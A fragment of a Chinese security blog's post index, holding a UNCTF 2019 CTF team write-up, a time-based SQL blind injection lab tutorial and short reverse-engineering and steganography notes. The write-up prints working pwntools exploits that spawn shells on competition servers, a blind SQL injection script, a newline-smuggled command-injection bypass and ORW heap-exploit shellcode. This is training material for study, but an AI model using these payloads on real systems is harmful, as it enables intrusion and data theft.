因为2和5都是素数，所以不存在取得的数重复现象\n\n总结一下：求每一个数可以得到几个2和几个5\n\n```\nL =[2,8,3,50]\n\ncount_2 ,count_5= 0,0\n\ndef count_2_5(i,n):\n    num = 0\n    while i % n == 0:\n        i  = i / 2\n        num += 1\n    return num\n\nfor i in L:\n    count_2 += count_2_5(i,2)\n    count_5 += count_2_5(i,5)\n\nprint(min(count_2,count_5))\n```\n\n\n\n\n\n\n\n","tags":["python"],"categories":["Code"]},{"title":"android 安全之环境搭建（一）","url":"/2020/02/05/逆向/android学习之环境搭建/","content":"\n[TOC]\n\n# android 安全（一）\n\n简单的学习做笔记\n\nandroid 现在基本都是以逆向脱壳为主，为了能够更加了解渗透测试，特地学习了一下逆向的基础知识。\n\n# 0x00 环境搭建\n\n不论从事那一方面的研究，第一件事都是搭建一个满意的环境，不然满是bug的环境会让你望而却步。\n\n**硬件要求**\n\n逆向需要的环境对系统要求不高，我自己是个游戏本，完全满足要求，就不需要在硬件上破费了。你只需要一个功能齐全的电脑都可以满足基本的学习要求。\n\n## 必备的一些软件安装\n\n推荐一个android下载站： https://www.androiddevtools.cn/#\n\n1. `jdk` ：这是android开发必备环境之一，由于一些软件限制，我准备的是`jdk-8u121-windows-x64`和`jdk-8u121-windows-i586`,当然也可以下载最新的，但有时会在安装某个软件的时候出现莫名其妙的问题。\n\n2. `android sdk`: （由于已经没有了单独的下载包，所以可以通过下载包含有android sdk 的android studio: 另一种是网上提供下载的链接，这个倒是蛮多的  下载链接：[android studio](https://developer.android.com/studio)）\n\n> 这里说一下android sdk 和android studio的区别\n>\n> Android SDK 是一个开发包。类似于JAVA SDK。里面包含了Android开发的各式各样的库文件。\n> Android studio是一个IDE（可视化开发工具）跟eclipse一样的东西。用来开发Android的工具。(studio 包含有sdk)\n\n3. `android NDK`:`Android NDK` 是一个工具集，可让您使用 C 和 C++ 等语言以原生代码实现应用的各个部分。对于特定类型的应用，这可以帮助您重复使用以这些语言编写的代码库[NDK](https://developer.android.com/ndk/downloads)   之后将ndk 安装的路径添加到`path` 环境变量中即可\n\n4. 开发环境安装 ，这里我安装的是`android studio` 因为`eclipse for Android Developers ` 已经不在维护了。\n\n   \n\n---\n\n刚开始学逆向，好多东西都是一知半解，如果有什么问题或者错误， 还望各位大佬狠狠的批评。","tags":["逆向"],"categories":["Reverse"]},{"title":"UNCTF竞技赛","url":"/2019/10/27/CTF/wp/K&A UNCTF/","content":"\n\n\n\n\n# UNCTF\n\nwp由K&A整理\n\n# WEB\n\n## 简单的备忘录 \n\n[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL Injection)\n\n工具扫没扫出结果 **没得到预期解**\n\n这题应该是出题人的疏忽\n\n先看看可用对象 \n\n```\n{\n    __schema {\n        types {\n            name\n        }\n    }\n}\nquery=\nquery IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        onOperation\n        onFragment\n        onField\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n\n```\n\n然后查属性 \n\n根据补全和之前的查对象 查数据的时候 查到了flag 写Wp的时候发现是个非预期\n\n```\npayload如下\nquery{\n  allUsers{\n    edges{\n      node{\n        id\n        username\n        memos{\n          edges{\n            node{\n              id\n              private\n              content\n              \n            }\n          }\n        }\n      }\n    }\n  }\n}\n\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/@~JDAMHA3P(0F4(ZXRI7Q9V.hc)\n\n## Checkin\n\n捡来的flag：0e4d1980ef6f8a81428f83e8e1c6e22b【运气题】\n\n啊 NodeJS的题 审计源码只是发现了可以操作的步骤而已。。\n\n关键点是在`/calc `\n\n`/calc __dirname `这种环境变量会有输出的 但是语句就不行 这可怎么办\n\n嗯 关键点还有` NodeJS`的`fs`组件 \n\n`var fs = require('fs');`\n\n `var contentText = fs.readFileSync('123.txt','utf-8');`\n\n然后 执行 `calc require('fs').readFileSync('/flag','utf-8');`\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/ZTS3@T2A7FD2G4AP@@)@151.hc)\n\n## 加密的备忘录[未解出]\n\n这题看着和简单的备忘录 并没有多大区别！ 上一题的payload这一题继续用\n\n当然 第一步都是 先看看可用对象 \n\n```\n{\n    __schema {\n        types {\n            name\n        }\n    }\n}\n\n```\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027231657.png)\n\n查出来了这么个东西 \n\n`到年种成到定过成个他成会为而时方上而到年到年以可为多为而到可对方生而以年为有到成上可我行到他的面为们方爱`\n\n这是什么加密？？我觉得不是移位，就是乱码。移位没有jio本就算了吧 我试试别的\n\n```\nquery=\nquery IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        onOperation\n        onFragment\n        onField\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n\n```\n\n这个payload是查属性的 感觉也很通用 但是怎么利用啊！【摔】\n\n## 帮赵总征婚\n\nweb签到题，F12看见注释中有rockyou，此文件为kali自带的密码\n\ngithub上下载其源码，拖进BP爆破(随缘出flag)\n\n## NSB Reset Password\n\n1 跳转到reset3.html页面，更改密码，由于没有验证，直接通过\n\n2 在登录界面登录得到flag\n\n这道题归为运气题，反正就那么出来了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1572191113.hc)\n\n## superwaf\n\n绕过方法\n\n?a=\\&b=%20%0al\\s%20/%0a\n\npayload:\n\n?a=\\&b=%20%0afi\\nd%20/var/%0a\n\nfind后直接跟path的时候会遍历目录\n\n访问http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt即可\n\n## easyadmin\n\n```\nimport requests\n\nurl = 'http://101.71.29.5:10049/index.php?file=forget'\nresult = ''\nfor x in range(0, 100):\n    high = 255\n    low = 0\n    mid = (low + high) // 2\n    while high > low:\n        payload = \"1'or if(ascii(substr((password),%d,1))>%d,1,0)#\" % (x, mid)\n        params = {\n            'username':payload\n        }\n        response = requests.post(url, data=params)#,proxies=proxies)\n        if b'hacker' in response.content:\n            print(\"error sql,exit\")\n            exit(0)\n        if b'ok' in response.content:\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n    result += chr(int(mid))\n    print(result)\n\n```\n\n密码跑出来是  flag{never_too                                        \n\n用户名admin \n\n登录之后 \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/XB)OJXJGB3_F1X55%~H6AP1.hc)\n\n\n\nemmm 从隐私模式退出来 \n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1572191405.hc)\n\n抓个包康康\n\n不过。。只能在 yes you are admin 这里 成功 \n\n改referer就好\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/1572224349.hc)\n\nflag {never_too_late_to_x}\n\n\n\n# MISC\n\n ## 亲爱的\n\n道题考的是脑洞。\n\n拿到一个mp3文件，使用mp3steg解出来一个flag，可惜是个假的\n\n尝试去播放发现共1.48min,但是只能播放到1.20min多，放到kali去分离一下，得到一个zip文件，打开发现存在一个加密的jpg文件，暴力破解失败，\n\n之后根据qmusic 2019.7.27 17:47 去搜索，大概翻了1000多条终于找到对应的评论--`真的上头` 得到密码\n\n拿到一个二次元图片，符合最近赵总的情况（偷笑）,图片比较大，修改后缀为zip，之后在image1.png找到flag\n\n## Hidden secret\n\n1 附件得到3个文件\n\n2 通过winhex 将文件内容顺序以Hex方式写入，生成一个新的文件\n\n3 通过binwalk -e 文件 得到一个压缩包，使用rar修复，解压出1.jpg和2.txt ，提示1.txt包含在1.jpg中\n\nhint:NTFS\n\n最后一天题目改了，不是很懂鸭\n\n将123的文件加上50 4B\n\n然后将其HEX数据全部放到一个文件中，改后缀zip\n\n解压后得图片，再得压缩包，最后是\n\nK<jslc7b5'gBA&]_5MF!h5+E.@IQ&A%EExEzp\\\\X#9YhiSHV#\n\n是BASE92编码（白费我1块钱）\n\n写脚本得\n\n`cca1a567c3145b1801a4f3273342c622`\n\n## 快乐的游戏题 \n\n真的是快乐的游戏题呢.... 玩了一下就出来了 \n\nflag c783910550de39816d1de0f103b0ae32\n\n6步出结果，这道题真的就是玩。\n\n\n\n# CRYPTO\n\n## 666\n\n将附件放到IDA里面进行分析，里面发现有encode，main函数部分，在main函数里面有比较flag的部分，那就先要将字符串通过encode函数反推到原本的字符串里面去。异或对称脚本完事。\n\n补充脚本 嘿嘿\n\n```\nkey=18\nenflag=r'izwhroz\"\"w\"v.K\".Ni'\n\nflag=\"\"\ni=0\n\nwhile (i<16):\n    print(chr((ord(enflag[i])^ 18) -6),end=\"\")\n    print(chr((ord(enflag[i+1]) ^ 18) + 6),end=\"\")\n    print(chr(ord(enflag[i+2]) ^ 18 ^ 6 ),end=\"\")\n    i +=3\n\nprint(flag)\n\n```\n\n## 不仅仅是RSA\n\n里面含有两个wav文件，两个公钥（public1(2).pem),以及一个RSA.py。\n\n首先解决两个wav文件，打开稍微试听一下基本可以确定是摩斯电码。放到在线网站去解（\n\nhttps://morsecode.scphillips.com/labs/audio-decoder-adaptive/?tdsourcetag=s_pcqq_aiomsg\n\n），发现解出来是c1，c2（估计是flag中间一半划开）\n\n在去解决公钥，使用openssl工具（或者在线解析网站）将公钥里面的e和n算出来，再到大素数在线网站去解决n（得到p，q），再使用RSA求m脚本解出m。\n\n```\nimport libnum\nimport gmpy2\n\nn=\ne=65537\np = 386123125371923651191219869811293586459\nq = 189239861511125143212536989589123569301\nassert n==p*q\n\nc=15116717704501623028903918131505510580599561357387431295289012193980554012811\nd=gmpy2.invert(e,(p-1)*(q-1))\nm=pow(c,d,n)\nprint libnum.n2s(m)\n```\n\n## 一句话加密\n\n将附件里面的图片放到winhex里面结尾有一段16进制的数字，那个为n\n\n用c1 得到flag的前半部分，c2得到后半部分\n\n直接上脚本：\n\n```\nimport gmpy2\n\ndef n2s(num):\n\tt = hex(num)[2:]\n\tif len(t) % 2 == 1:\n\t\treturn ('0'+t).decode('hex')\n\treturn t.decode('hex')\n\nc = 62501276588435548378091741866858001847904773180843384150570636252430662080263\np = 275127860351348928173285174381581152299\nq = 319576316814478949870590164193048041239\nn = p*q\nr = pow(c,int((p+1)/4),p)\ns = pow(c,int((q+1)/4),q)\na = gmpy2.invert(p,q)\nb = gmpy2.invert(q,p)\nx =(a*p*s+b*q*r)%n\ny =(a*p*s-b*q*r)%n\n\nprint n2s(x%n)\nprint n2s((-x)%n)\nprint n2s(y%n)\nprint n2s((-y)%n)\n\nunctf{412a1ed6d21e55191ee5131f266f5178}\n\n```\n\n\n\n# REVERSE\n\n## 奇怪的数组\n\n本题为32位PE文件，无壳无花。有符号表\n\nIDA载入，main函数F5\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027232649.png)\n\n很明显要求输入格式flag{xxxxx}，且xxxxx为32位\n\n下面做16轮判断，v10为v11高位\n\n查看char2hex\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027232724.png)\n\n要求输入为0-9或a-f，将其转换成hex对应的0-9和a-f\n\nV9为高低位拼接，其实就是将输入分成两位一组，比如输入3a，则v9=0x3a\n\n然后和box比较\n\nbox=[ 0xAD,0x46, 0x1E,0x20, 0x3C,0x79, 0x75,0xB3, 0x5E,0x52, 0x79,0x60, 0xCB,0xFE, 0xB0,0x6C]\n\n因此很明显输入是ad461e203c7975b35e527960cbfeb06c即可\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/clip_image002.gif)\n\n\n\n## easy_Maze\n\n很简单的迷宫\n\n开局push初始迷宫数据\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090321.png)\n\nStep0,step1对迷宫做混淆，v5回调，step2输入走迷宫\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090342.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090353.png)\n\n看到迷宫只要走到右下角数组坐标v5[6][6]即可\n\nIDA直接远程调试，看v5\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090407.png)\n\nSsddwdwdddssaasasaaassddddwdds\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191028090425.png)\n\n# PWN\n\n## soso easy pwn\n\n栈空间复用，因为开了pie，所以爆破就玩事儿\n\nUNCTF{S0_so_E4zy_Pwn}\n\n脚本一：\nauto 爆破：\n\n```\nfrom pwn import *\nimport binascii\ncontext.log_level = 'debug'\n\nelf = ELF('./x86_libc.so.6')\noffset = 12\ni = 0\n\nwhile True:\n\ti += 1\t\n\tprint i\t\n\tsh = process('./pwn')\n\t#sh = remote('101.71.29.5',10000)\t\n\tsh.recvuntil('the ')\n\t#sh.recvuntil('\\x32')\n\tbase = int(sh.recv(5)) << 16\n\tprint hex(base)\n\tsh.recvuntil('name?\\n')\t\n\tpayload = 'a'*offset\n\t#addr = base + random.sample(list1,1)[0]\t\n\tpayload += p32(base+0x59d6)\n\tsh.send(payload)\n\tsh.recvuntil('(1.hello|2.byebye):\\n')\n\tsh.send('0')\n\ttry:\t\t\n\t\tsh.recv(timeout = 1)\n\t\t\n\texcept Exception as e:\n\t\tsh.close()\n\t\tcontinue\n\telse:\n\t\tsleep(0.1)\n\t\tsh.interactive()\n\n```\n\n脚本二：\n\n穷苦人士，不会写循环，就手工\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\nelf = ELF('./x86_libc.so.6')\n\\#p = process('./pwn')\noffset = 12\n\np = remote('101.71.29.5',10000)\np.recvuntil('our the ')\nbase_addr = int(p.recv(5)) << 16\nprint hex(base_addr)\np.recvuntil('name?\\n')\t\npayload = 'c'*offset\t\npayload += p32(base+0x69cd)\np.send(payload)\np.recvuntil('byebye):\\n')\np.send('0')\np.interactive()\n```\n\n## baby rop\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191027234103.png)\n\n好了，栈迁移 + one_gadget！\n\n```\nfrom pwn import *\nfrom LibcSearcher import *\ncontext.log_level = 'debug'\nsh = process('./babyrop')\nsh = remote('101.71.29.5',10041)\nelf = ELF('./babyrop')\nlibc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')\n\nread_plt = elf.plt['read']\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nread_got = elf.got['read']\nmain_addr = 0x08048592\npop_ret = 0x080483b5\npop3_ret = 0x08048659\nleave_ret = 0x08048468\nbuf = elf.bss() + 0x500\nbuf2 = elf.bss() + 0x400\n\nsh.recvuntil('\\n')\npayload = 'a'*0x20 + p32(1717986918)\nsh.sendline(payload)\nsh.recvuntil('name?\\n')\npayload = 'a'*0x14  + p32(puts_plt)+p32(pop_ret) + p32(puts_got) + p32(0x0804853D)\nsh.sendline(payload)\naddr = u32(sh.recvuntil('\\xf7')[-5:])\n\nbase = addr - libc.symbols['puts']\nsystem_addr = base + libc.symbols['system']\nbinsh = base + libc.search('/bin/sh\\x00').next()\nsleep(0.1)\nsh.recvuntil('name?\\n')\npayload = 'a'*0x10 + p32(0x0804A020) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(0x0804A020) + p32(0x20)\nsh.sendline(payload)\nsleep(0.1)\n\npayload = p32(0x0804A080)\npayload += p32(read_plt)\npayload += p32(leave_ret) \npayload += p32(0)\npayload += p32(0x0804A080)\npayload += p32(40)\nsh.sendline(payload.ljust(39-8,'a'))\n\npayload = 'aaaa'\npayload += p32(base +0x3a819 )\nsh.sendline(payload)\n\nlog.success('system =' + hex(system_addr))\nlog.success('binsh =' + hex(binsh))\n\nsh.interactive()\n\nUNCTF{7ef293810e29039f061982e72fd10bfb}\n\n```\n\n## EasyShellCode\n\n只能说V爷爷太强了，用V爷爷的ae64脚本https://github.com/veritas501/ae64\n\n改一下他现成得exp即可\n\n\n\n这题的限制条件也就是base64，只是通过if展示罢了。\n\n```\nfrom pwn import *\nfrom ae64 import AE64 \n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\np = remote('101.71.29.5',10080)\nobj = AE64()\nsc = obj.encode(asm(shellcraft.sh()))\np.sendline(sc)\np.interactive()\nUNCTF{x64_A5c11_shE11c0dE_i5_50_Ea5y}\n```\n\n## orwheap\n\n```\nfrom pwn import *\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\nsh = remote('101.71.29.5', 10005)\nelf = ELF('pwn')\nlibc = ELF('./x64_libc.so.6')\n\n\ndef add(size, content):\n    sh.sendlineafter('Your Choice: ', '1')\n    sh.sendlineafter(': ', str(size))\n    sh.sendafter(': ' , content)\n\ndef delete(index):\n    sh.sendlineafter('Your Choice: ', '2')\n    sh.sendlineafter(': ', str(index))\n\ndef edit(index, content):\n    sh.sendlineafter('Your Choice: ', '3')\n    sh.sendlineafter(': ', str(index))\n    sh.sendafter(': ' , content)\n\nadd(0x68, '\\n')\nadd(0x78, '\\n')\nadd(0x68, (p64(0) + p64(0x21)) * 6 + '\\n')\nadd(0x68, (p64(0) + p64(0x21)) * 6 + '\\n')\ndelete(0)\nadd(0x68, 'a' * 0x60 + p64(0) + p8(0xf1))\ndelete(1)\ndelete(2)\nadd(0x78, '\\n')\n\ndelete(0)\nadd(0x68, 'a' * 0x60 + p64(0) + p8(0xa1))\ndelete(1)\nadd(0x98, '\\n')\nedit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p16(0x55dd))\n\nadd(0x68, '\\n')\nadd(0x68, 'c' * 0x33 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + '\\n')\nsh.recvn(0x88)\nlibc_addr = u64(sh.recvn(8)) - libc.symbols['_IO_2_1_stdin_']\nlog.success('libc_addr: ' + hex(libc_addr))\n\nedit(1, 'b' * 0x70 + p64(0) + p64(0x91))\ndelete(2)\nedit(1, 'b' * 0x70 + p64(0) + p64(0x91) + p64(0) + p64(libc_addr + \nlibc.symbols['__free_hook'] - 0x20))\nadd(0x88, '\\n')\n\nedit(1, 'b' * 0x70 + p64(0) + p64(0x71))\ndelete(2)\nedit(1, 'b' * 0x70 + p64(0) + p64(0x71) + p64(libc_addr + \nlibc.symbols['__free_hook'] - 0x13))\n\nframe = SigreturnFrame()\nframe.rdi = 0\nframe.rsi = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 #\nframe.rdx = 0x2000\nframe.rsp = (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000 \nframe.rip = libc_addr + 0x00000000000bc375 #: syscall; ret;    --> rcx\npayload = str(frame)\nadd(0x68, payload[0x80:0x80 + 0x60] + '\\n')\nadd(0x68, 'fff' + p64(libc_addr + libc.symbols['setcontext'] + 53) + '\\n')\n'''\n<setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]\n<setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]\n<setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]\n<setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]\n<setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]\n<setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]\n<setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]\n<setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]\n<setcontext+94>:  push   rcx\n<setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]\n<setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]\n<setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]\n<setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]\n<setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]\n<setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]\n<setcontext+125>: xor    eax,eax\n<setcontext+127>: ret  \n'''\n\nprint hex(u64(payload[0xa8:0xa8+8]))\n\nedit(1, payload[:0x98])\n\ndelete(1)\n\nlo = [\n    libc_addr + 0x0000000000021102, #: pop rdi; ret; \n    (libc_addr + libc.symbols['__free_hook']) & 0xfffffffffffff000,\n    libc_addr + 0x00000000000202e8, #: pop rsi; ret; \n    0x2000,\n    libc_addr + 0x0000000000001b92, #: pop rdx; ret; \n    7,\n    libc_addr + 0x0000000000033544, #: pop rax; ret; \n    10,\n    libc_addr + 0x00000000000bc375, #: syscall; ret; \n    libc_addr + 0x0000000000002a71, #: jmp rsp; \n]\n\nshellcode = asm('''\nsub rsp, 0x800\npush 0x67616c66\nmov rdi, rsp\nxor esi, esi\nmov eax, 2\nsyscall\n\ncmp eax, 0\njs failed\n\nmov edi, eax\nmov rsi, rsp\nmov edx, 0x100\nxor eax, eax\nsyscall\n\nmov edx, eax\nmov rsi, rsp\nmov edi, 1\nmov eax, edi\nsyscall\n\njmp exit\n\nfailed:\npush 0x6c696166\nmov edi, 1\nmov rsi, rsp\nmov edx, 4\nmov eax, edi\nsyscall\n\nexit:\nxor edi, edi\nmov eax, 231\nsyscall\n''')\nsh.send(flat(lo) + shellcode)\n\nsh.interactive()\nclear()\n\n```\n\n","tags":["CTF"],"categories":["CTF"]},{"title":"SQL注入(时间盲注)","url":"/2019/10/04/CTF/墨者学院/SQL注人(时间盲注)/","content":"\n了解盲注语法，如何利用盲注获取数据\n\n<!-- more -->\n\n# 目标\n\n * 了解SQL时间盲注\n * 掌握SQL注入语法\n * 掌握SQL注入原理\n * 了解SQL注入常用注释字符\n >本题使用的工具\n \tsqlmap，hackbar\n >环境\n \t物理机：windows10\n \t虚拟机：kali\n # 时间盲注\n ## 1 判断是否存在盲注\n\n可以发现判断有多种方式，只要能保证sleep()执行，就可以根据回显的时间判断是否存在时间注入\n```url\n命令1 ：http:/ip/flag.php?type=1 and sleep(5) '\n命令2：http://ip/flag.php?type=1 and if(ascii(substr(database(),1,1))=114,1,sleep(5))'\n命令3：http://ip/flag.php?type=1 and if(1=0,1,sleep(10)) --\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190610234646882.png)\n\n发现存在明显的延迟，说明存在时间注入，这里我采取的做法是盲注，最后发现存在回显，也可以直接获取，就不多叙述了。\n\n## 2 获取数据库\n* 猜解数据库长度\n\t测试数据库的长度，当12时发生时间注入\n\t```url\n\thttp://ip/flag.php?type=1 and if(length(database())=12,sleep(5),1) --+\n\t```\n\t![在这里插入图片描述](https://img-blog.csdnimg.cn/20190610235206646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\n\n* 猜解数据库名\n\t解释几个函数的用法\n\t1 `database()`： 获取数据库\n\t2 `substr()`：截取字符串函数\n\t用法：substr(string string,num start,num length);\n\tstring为字符串；\n\tstart为起始位置；\n\tlength为长度。\n\t3 `ascii()`：返回字符串str的最左面字符的ASCII代码值\n\t4 `if(语句1，语句2，语句3)` ：如果语句1正确执行语句2，否则执行语句3\n\n\t第一位 112 对应 p\n\t使用注入语句**if(ascii(substr(database(),1,1))**\n```URL\nhttp://ip/flag.php?type=1 and if(ascii(substr(database(),1,1))=112,sleep(5),1) --+\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611000422360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)\t剩下的交给sqlmap去跑\n命令：`sqlmap -u url --dbs`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611000446519.png)## 3 猜解表\n* 1 猜解表的长度\n\t这里都是猜解的最终flag的表和数据库\n\t发现在当长度为4 时发生延时\n\t```url\n\thttp://ip/flag.php?type=1 and if(length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4,sleep(5),1) --\n\t```\n* 2 猜解表\n\t* 通过ascii去判断\n\t判断第一位是否是字母\n```\turl\n\thttp://219.153.49.228:40472/flag.php?type=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))>96,sleep(5),1) --\n```\n当前数据库的第三张表的第一个字符为f\n```url\n\thttp://ip/flag.php?type=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))>102,sleep(5),1) --\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001117514.png)\t*  使用left去猜解\n\t`left(str,length)` ：LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。\n```url\nhttp://ip/flag.php?type=1 and if (left((select table_name from information_schema.tables where table_schema=database() limit 1,1),4)='flag',sleep(5),1)--+\n```\nsqlmap 跑出剩余的\n命令：`sqlmap -u url -D pentesterlab --tables`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001557667.png)## 4 获取字段值\n\n* 猜解长度\n\t猜解第二个字段值的长度\n```url\nhttp://ip/flag.php?type=1 and if(length((select column_name from information_schema.columns where table_name='flag' limit 1,1))=4,sleep(5),1)—\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001730951.png)\n* 猜解字段值\n\t第一个字段值的第3位 为i\n```url\nhttp://ip/flag.php?type=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),1,1))=105,sleep(4),1) --\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611001842476.png)\t第一个字段值的第2位 为d\n```url\nhttp:/ip/flag.php?type=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),2,1))>99,sleep(4),1) --\n```\n所以第一个字段值为id\n* left\n\t利用left求第二个字段值\n\t第一个字符为f，直接猜测flag\n```url\n\thttp://ip/flag.php?type=1 and if(left((select column_name from information_schema.columns where table_name=0x666c6167 limit 1,1),1)='f',sleep(4),1) --\n\t成功延时\n\thttp://219.153.49.228:40472/flag.php?type=1 and if(left((select column_name from information_schema.columns where table_name=0x666c6167 limit 1,1),4)='flag',sleep(4),1)—\n```\n## 5 下载数据\n* 猜长度\n\t猜测第一个数据的长度为6\n```url\n\thttp://ip/flag.php?type=1 and if(length((select flag from flag limit 0,1))=6,sleep(4),1)--\n```\n\n* 猜数据\n\t第一位数据为m\n```url\n\thttp://ip/flag.php?type=1 and if(ascii(substr((select flag from flag limit 0,1),1))=109,sleep(4),1)--\n```\n\t直接猜测mozhe发现缺少一位，猜测最后一位\n```url\n\thttp://ip/flag.php?type=1 and if(ascii(substr((select flag from flag limit 0,1),6))=49,sleep(4),1)--\n```\n最后一位是1\n\n使用left验证\n\t成功延时，拿到flag去验证把\n```url\n\thttp://ip/flag.php?type=1 and if(left((select flag from flag limit 0,1),6)='mozhe1',sleep(4),1)--\n```\n 使用sqlmap验证\n 命令：`sqlmap -u url -D pentesterlab -T flag -C flag --dump`\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190611002407450.png)\n # 总结\n 时间盲注特别耗时间，在做的过程中要仔细，还要注意每个函数的括号，避免由于少个括号一直错误。\n\n---\n永远不要停下学习的脚步\n","tags":["sql盲注"],"categories":["CTF"]},{"title":"实验吧-隐写-欢迎来到地狱","url":"/2019/10/04/CTF/实验吧/实验吧-隐写-欢迎来到地狱/","content":"\n多重隐写+加密，需要清醒的认识，才能不坠入地狱\n\n<!-- more -->\n\n# 实验吧\n\n## 隐写题\n\n### 欢迎来到地狱\n\n1.  解压\n\n    访问url，获取一个zip文件，解压发现存在3个文件 分别是jpg，doc，zip\n\n    根据文件名去，首先我们去打开第一个文件地狱伊始.jpg 打开提示文件错误。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175715.png)\n\n    使用winhex打开查看，发现是jfif的文件，之后看到文件头标识不对，查询发现jfif的文件头是`FFD8FFFE00, .JPEG;.JPE;.JPG, \"JPGGraphic File\"` 我们添加文件头，方法：右键->edit->Paste zero bytes -> 4 添加四个比特\n    \n    之后添加为\n    \n    ![图片.png](https://upload-images.jianshu.io/upload_images/18851353-865de8c22816711b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n    打开图片\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175722.png)\n\n\n    图片链接失效，这里需要去隔壁wp里面找一个\n    \n    